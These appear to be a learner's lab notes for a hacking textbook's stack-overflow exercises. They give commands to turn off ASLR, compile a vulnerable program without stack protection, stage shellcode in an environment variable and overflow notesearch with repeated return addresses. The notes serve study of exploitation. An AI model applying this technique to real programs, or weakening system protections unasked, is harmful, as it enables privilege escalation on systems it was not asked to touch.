# disable ASLR in host (default is 2 and read-only in the container)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization

cd chapter02/
gcc -g notetaker.c -o notetaker.out
gcc -g -m32 -fno-stack-protector -z execstack -fno-pie -no-pie notesearch.c -o notesearch.out

cd chapter03/
gcc -g getenvaddr.c -o getenvaddr.out

cd chapter05/
nasm -f elf helloworld_nosegment.asm
ld -m elf_i386 helloworld_nosegment.o -o helloworld_nosegment.out

cd ..
export SHELLCODE=$(cat chapter05/helloworld_nosegment.out)
# address change everytime
./chapter03/getenvaddr.out SHELLCODE chapter02/notesearch.out

# OUTPUT
SHELLCODE will be at 0xffffde71
ff|ff|de|71

# create a fake note first
./chapter02/notetaker.out test
# exploit
# TODO >>> verify how to calculate 40 ???
./chapter02/notesearch.out $(perl -e 'print "\x71\xde\xff\xff"x40')

SHELLCODE will be at 0xbffff9c6
reader@hacking:~/booksrc $ ./notesearch $(perl -e 'print "\xc6\xf9\xff\xbf"x40')

---

nasm -f elf helloworld_nonull.s
ld helloworld_nonull.o -o helloworld_nonull.out

export SHELLCODE=$(cat chapter05/helloworld_nonull.out)
./chapter03/getenvaddr.out SHELLCODE chapter02/notesearch.out
SHELLCODE will be at 0xffffde78

ff|ff|de|78

./chapter02/notesearch.out $(perl -e 'print "\x78\xde\xff\xff"x40')

hexdump -C ./chapter05/helloworld_nonull.out | grep --color=auto 00

# TODO
* address 40 ???
* nullbytes
